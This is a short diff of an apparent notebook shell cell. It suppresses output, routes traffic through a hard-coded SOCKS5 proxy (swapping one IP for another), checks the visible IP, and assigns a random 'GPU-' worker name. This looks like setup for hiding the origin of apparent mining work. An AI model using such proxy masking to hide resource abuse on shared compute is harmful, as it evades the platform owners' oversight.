@@ -3,7 +3,7 @@
 !%%capture
 
 #gives ip address 
-export http_proxy=socks5://176.101.80.192:1080; curl ipecho.net/plain
+export http_proxy=socks5://217.26.176.82:1080; curl ipecho.net/plain
 curl ipecho.net/plain
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
 
